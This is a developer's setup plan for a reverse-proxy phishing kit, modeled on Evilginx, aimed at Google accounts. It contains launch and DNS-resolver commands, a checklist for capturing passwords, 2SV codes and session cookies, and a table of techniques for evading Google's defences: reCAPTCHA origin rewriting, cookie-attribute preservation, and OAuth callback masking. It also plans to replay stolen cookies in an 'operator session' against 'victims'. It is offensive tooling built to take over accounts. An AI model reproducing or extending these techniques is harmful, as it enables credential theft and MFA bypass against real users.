# Google Target — Initial Setup Plan

Config: `configs/targets/google.json` (15 routing entries, 14 tracked cookies).
Modeled on `microsoft.json`. The `extendAliasMapDynamic` xmlns fix (see
`microsoft-setup.md`) applies globally, so `gstatic` SVGs won't be corrupted.

## Launch (separate instance from Microsoft)
The proxy is single-base-domain per process, so Google runs on its own
instance/ports and its own `/etc/resolver` entry. Pick a base domain — here
`google.test` — and non-conflicting ports:

```
sudo pkill -9 evilpikin
sudo ./evilpikin \
  -domain google.test \
  -https 127.0.0.1:9444 -http 127.0.0.1:9081 \
  -dns 127.0.0.1:5334 -api-addr 127.0.0.1:8081 \
  --no-tui > /tmp/ep-google.log 2>&1 &
```

Install the resolver (once):
```
echo 'nameserver 127.0.0.1
port 5334' | sudo tee /etc/resolver/google.test
```

Then load: `https://accounts.google.test:9444/`

## Verification checklist
- [ ] Login page (accounts.google.test) renders; `gstatic` logos/backgrounds load
      (no "Failed to external resource").
- [ ] `identifier` → `password` → post submits through the proxy (no escape to
      real origin).
- [ ] Consent / oauthconsent flow renders and posts back in-proxy.
- [ ] `[+] Credential captured` + `__Secure-*` / `SID` cookies persisted.
- [ ] Profile images from `lh3-6.googleusercontent.google.test` load.
- [ ] No host leaks to real `google.com` / `gstatic.com` in HTML/JS/referrer.

## Google-specific risks to watch
- **Risk detection:** Google is aggressive about bot/impersonation signals
  (JS challenges, risk cookies). May need `require_lure` off + clean headers.
- **`__Secure-*` cookies:** flagged `Secure`; ensure the proxy serves them over
  HTTPS and rewrites their `Domain` to the phishing host (rewriteCookieDomains).
- **Consent/oauth round-trips:** callback URLs (`redirect_uri`, `state`) must
  stay valid — the `protectCallbackURLs` mask already preserves real origins for
  these; verify Google's validation doesn't reject.
- **gstatic / googleapis CORS:** cross-subdomain fetches (accounts.google.test →
  gstatic.google.test) rely on the reflected CORS headers; confirm no console
  CORS errors.
- **MFA (phone/prompt):** like Microsoft, confirm the second factor step is
  captured and proxied without breaking the flow.

## Open question
Whether Microsoft and Google should share one base domain (e.g. both under
`ms.test` with proxy hosts `accounts.google.ms.test`) or run as separate
instances. Separate instances isolate resolver/port config but cost a second
process; single-instance is simpler but mixes campaigns. Decide per deployment.

# Why Evilginx Community Edition fails on Google — and how we handle it

Research (community phishlets `google-botguard-bypass.yaml`, An0nUD4Y/Evilginx-Phishlets,
and post-mortems) shows CE fails on Google for a handful of concrete, repeatable
reasons. Each maps to something our proxy already does — or now does — differently.

| # | Evilginx CE failure mode | Consequence on Google | Our handling |
|---|--------------------------|-----------------------|--------------|
| 1 | **GET-param rewriting breaks functionality.** CE rewrites *every* URL param, mangling `co`, `script` (jserror), `continue`, `bgrequest`, CheckCookie/RotateCookiesPage, etc. | Login stalls or 400s; reCAPTCHA domain mismatch. | Our rewrite is a **plain string replace** — it never touches base64 blobs, so `co` stays intact on served pages. See #2 for the one proactive fix. |
| 2 | **reCAPTCHA Enterprise `co` param mismatch.** `co` is base64url(`https://accounts.google.com`); the registered reCAPTCHA sitekey only validates that exact origin. If the victim's client JS recomputes `co` from `location.origin` (phishing host), Google rejects it. | "Failed to load reCAPTCHA" / unusual-traffic loop. | `fixRecaptchaCo` (`handler.go`) force-decodes every outbound `co=`, rewrites the embedded host back to the **real** origin, re-encodes. No-op when already correct. |
| 3 | **Botguard / "unusual traffic" JS challenge.** Google runs a client-side botguard (`batchexecute?rpcids=V1UmUe`) that CE can't solve without a headless browser (Evilpuppet). | Victim stuck on a CAPTCHA / "unusual activity". | A **human** victim's real browser solves botguard natively. As long as we don't corrupt the `batchexecute` body or `co`, the victim's browser handles it. We do NOT need Evilpuppet. (If we ever automate, this is the gap.) |
| 4 | **`__Secure-*` / `__Host-*` cookie hardening.** CE's lua `gsub` strips `Secure`/`Max-Age`/`Expires`, breaking partitioned `__Host-*` cookies and `__Secure-*` requirements. | Session cookie rejected by browser; instant re-auth. | `rewriteCookieDomains` only rewrites the `Domain=` attribute and **preserves Secure/HttpOnly/Partitioned/Expires**. New guard: `__Host-` cookies are left host-only (no `Domain` added) per spec. |
| 5 | **Two-step login (identifier → password).** Google splits the flow: POST `identifier`, then a second page POSTs the password. CE keyed on `passwd`; Google's actual field is `Passwd`. | Password never captured. | `username_field: "identifier"` (step 1) and `password_field: "Passwd"` (step 2) set in `google.json`; `parseCredentials` falls back to `Passwd`/`passwd`. Both steps accumulate in one victim session. |
| 6 | **2SV / MFA field name.** Google's 2SV input is `Pin`/`totp`, not `otp`. | Second factor never captured. | `parseCredentials` now also tries `pin`/`Pin`/`totp`/`Totp`. |
| 7 | **consent / oauth `redirect_uri` & `state` validation.** Google validates these server-side; a phishing-rewritten `redirect_uri` is rejected. | OAuth/consent aborts. | `protectCallbackURLs` masks `redirect_uri`/`wreply`/`state` back to the real origin on outbound requests (same as Microsoft). The response side re-aliases them to phishing so client validation passes. |
| 8 | **postMessage / iframe origin checks.** Google uses iframes (reCAPTCHA, botguard) and `postMessage` between `accounts.google.com` and `content.googleapis.com`; an inconsistently rewritten origin fails the `event.origin` check. | Iframe flows silently break. | Our `extendAliasMapDynamic` self-heals every `<realhost>` → `<realhost>.<baseDomain>`, and `htmlHostRE` rewrites `https://accounts.google.com` inside JS strings, so parent + iframe share a consistent phishing origin set. |
| 9 | **Cross-subdomain CORS (`origin: null`).** Some Google fetches send `Origin: null`; reflecting the request origin literally can omit ACAO. | Credentialed fetch fails. | CORS reflects the request `Origin`; for `origin: null` fetches (non-credentialed) this is acceptable. Monitor console; if needed, fall back to `Access-Control-Allow-Origin: *` for null-origin preflights. |

## Hardening already implemented for Google
- `fixRecaptchaCo` — outbound `co` param forced to real origin (`handler.go`).
- `__Host-` cookie guard — host-only cookies keep spec-compliant scope (`rewriteCookieDomains`).
- `Passwd` / `Pin` / `totp` credential-field fallbacks (`capture.go`).
- Routing extended to 40 hosts (Workspace, YouTube, gstatic, googleusercontent,
  googleapis, apis, ogs, support, policies, plus) so every sub-resource loads in-proxy.

## Still to validate live
- [ ] Botguard presents no hard CAPTCHA loop for a real victim browser.
- [ ] `__Secure-3PSID` persists and is replayable in the operator session.
- [ ] `origin: null` CORS fetches (e.g. from `data:`/`redirect`) don't error.
- [ ] Two-step identifier→password→2SV captured end-to-end in one session row.
